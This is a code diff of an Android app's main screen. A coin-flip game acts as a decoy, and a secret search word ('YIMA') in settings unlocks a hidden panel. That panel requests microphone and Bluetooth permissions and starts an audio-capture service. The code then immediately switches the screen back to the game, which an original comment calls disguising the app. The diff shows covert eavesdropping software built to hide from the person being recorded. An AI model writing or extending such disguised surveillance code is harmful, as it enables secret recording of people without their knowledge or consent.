@@ -22,12 +22,10 @@ class MainActivity : AppCompatActivity() {
     private var isCapturing = false
     private val handler = Handler(Looper.getMainLooper())
 
-    // The layouts
     private lateinit var gameLayout: LinearLayout
     private lateinit var settingsLayout: LinearLayout
     private lateinit var stealthLayout: LinearLayout
     
-    // Game elements
     private lateinit var coinImage: TextView
     private lateinit var streakText: TextView
     private var currentStreak = 0
@@ -46,12 +44,10 @@ class MainActivity : AppCompatActivity() {
 
         val rootLayout = FrameLayout(this)
         
-        // Build all 3 screens
         gameLayout = buildGameUI()
         settingsLayout = buildSettingsUI()
         stealthLayout = buildStealthUI()
         
-        // Hide settings and stealth by default
         settingsLayout.visibility = View.GONE 
         stealthLayout.visibility = View.GONE 
 
@@ -62,9 +58,6 @@ class MainActivity : AppCompatActivity() {
         setContentView(rootLayout)
     }
 
-    // ==========================================
-    // 1. THE COIN FLIP GAME (MAIN SCREEN)
-    // ==========================================
     private fun buildGameUI(): LinearLayout {
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -73,7 +66,6 @@ class MainActivity : AppCompatActivity() {
             layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT)
         }
 
-        // Top bar for the Settings Gear icon
         val topBar = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.END
@@ -129,18 +121,14 @@ class MainActivity : AppCompatActivity() {
 
     private fun flipCoin() {
         gameLayout.isEnabled = false
-        
         val animator = ObjectAnimator.ofFloat(coinImage, "rotationY", 0f, 1440f).apply {
             duration = 1000
             interpolator = LinearInterpolator()
         }
-
         animator.addListener(object : android.animation.AnimatorListenerAdapter() {
             override fun onAnimationEnd(animation: android.animation.Animator) {
                 gameLayout.isEnabled = true
-                val isHeads = Random.nextBoolean()
-                
-                if (isHeads) {
+                if (Random.nextBoolean()) {
                     coinImage.text = "👑"
                     currentStreak++
                     streakText.text = "Heads in a row: $currentStreak"
@@ -154,9 +142,6 @@ class MainActivity : AppCompatActivity() {
         animator.start()
     }
 
-    // ==========================================
-    // 2. THE SETTINGS SCREEN (WITH SECRET SEARCH)
-    // ==========================================
     private fun buildSettingsUI(): LinearLayout {
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -172,7 +157,6 @@ class MainActivity : AppCompatActivity() {
             setPadding(0, 0, 0, 30)
         }
 
-        // The Search Bar
         val searchLayout = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
             setBackgroundColor(android.graphics.Color.parseColor("#EEEEEE"))
@@ -185,7 +169,6 @@ class MainActivity : AppCompatActivity() {
             layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
         }
 
-        // Clickable search icon to trigger the unlock
         val searchBtn = TextView(this).apply {
             text = "🔍"
             textSize = 20f
@@ -194,7 +177,7 @@ class MainActivity : AppCompatActivity() {
                 if (searchInput.text.toString().uppercase() == "YIMA") {
                     settingsLayout.visibility = View.GONE
                     stealthLayout.visibility = View.VISIBLE
-                    searchInput.setText("") // clear it
+                    searchInput.setText("") 
                 } else {
                     Toast.makeText(this@MainActivity, "Not found", Toast.LENGTH_SHORT).show()
                 }
@@ -219,9 +202,6 @@ class MainActivity : AppCompatActivity() {
         return layout
     }
 
-    // ==========================================
-    // 3. THE HIDDEN CONTROLS (STEALTH UI)
-    // ==========================================
     private fun buildStealthUI(): LinearLayout {
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -237,12 +217,9 @@ class MainActivity : AppCompatActivity() {
                     Manifest.permission.RECORD_AUDIO, 
                     Manifest.permission.MODIFY_AUDIO_SETTINGS
                 )
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                    perms.add(Manifest.permission.BLUETOOTH_CONNECT)
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    perms.add(Manifest.permission.POST_NOTIFICATIONS) // Crucial for foreground service on Android 13+
-                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) perms.add(Manifest.permission.BLUETOOTH_CONNECT)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) perms.add(Manifest.permission.POST_NOTIFICATIONS)
+                
                 ActivityCompat.requestPermissions(this@MainActivity, perms.toTypedArray(), 1)
             }
         }
@@ -278,17 +255,24 @@ class MainActivity : AppCompatActivity() {
         val btnStart = Button(this).apply {
             text = "START LISTENING"
             setOnClickListener {
-                val intent = Intent(this@MainActivity, AudioCaptureService::class.java)
-                if (!isCapturing) {
-                    startForegroundService(intent)
-                    isCapturing = true
-                    // INSTANTLY disguise the app as the Coin Game
-                    stealthLayout.visibility = View.GONE
-                    gameLayout.visibility = View.VISIBLE
-                } else {
-                    stopService(intent)
-                    isCapturing = false
-                    this.text = "START LISTENING"
+                try {
+                    val intent = Intent(this@MainActivity, AudioCaptureService::class.java)
+                    if (!isCapturing) {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(intent)
+                        } else {
+                            startService(intent)
+                        }
+                        isCapturing = true
+                        stealthLayout.visibility = View.GONE
+                        gameLayout.visibility = View.VISIBLE
+                    } else {
+                        stopService(intent)
+                        isCapturing = false
+                        this.text = "START LISTENING"
+                    }
+                } catch (e: Exception) {
+                    Toast.makeText(this@MainActivity, "CRASH PREVENTED: ${e.message}", Toast.LENGTH_LONG).show()
                 }
             }
         }
